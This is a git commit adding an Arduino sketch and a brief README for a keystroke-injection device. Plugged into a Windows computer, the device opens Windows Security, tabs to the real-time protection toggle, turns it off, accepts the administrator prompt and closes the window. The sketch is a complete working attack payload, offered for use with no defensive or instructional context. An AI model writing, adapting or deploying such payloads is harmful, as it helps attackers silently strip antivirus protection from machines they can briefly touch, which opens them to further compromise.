a40ba2be65522d3e5ffe3347cfc5b08c1a7b2370
WireBits <159493381+wirebits@users.noreply.github.com>
2024-04-11 22:26:59 +0530

    Add files via upload

---
+++ DisableWindowsDefender/DisableWindowsDefender.ino
@@ -0,0 +1,42 @@
+/*
+ * Disable Windows Defender
+ * It turns off the Windows Defender.
+ * Author - WireBits
+ */
+#include<Keyboard.h>
+void setup()
+{
+ Keyboard.begin();
+ delay(1000);
+ Keyboard.press(KEY_LEFT_GUI);
+ Keyboard.releaseAll();
+ delay(1000);
+ Keyboard.print("virus and threat protection");
+ delay(1000);
+ Keyboard.press(KEY_RETURN);
+ Keyboard.releaseAll();
+ delay(1000);
+ for (int i=1; i<=4; i++)
+ {
+  delay(1100);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+ }
+ delay(1000);
+ Keyboard.write(32);
+ delay(1000);
+ Keyboard.write(32);
+ delay(1000);
+ Keyboard.press(KEY_LEFT_ALT);
+ Keyboard.press('y');
+ Keyboard.releaseAll();
+ delay(1000);
+ Keyboard.press(KEY_LEFT_ALT);
+ Keyboard.press(KEY_F4);
+ Keyboard.releaseAll();
+ Keyboard.end();
+}
+void loop()
+{
+ //Nothing to do here ;)
+}
---
+++ DisableWindowsDefender/README.md
@@ -0,0 +1,6 @@
+# Disable Windows Defender
+It turns off the Windows Defender.
+
+# Use
+- Compile and upload the code on any supported board you have using Arduino IDE.
+- Done!
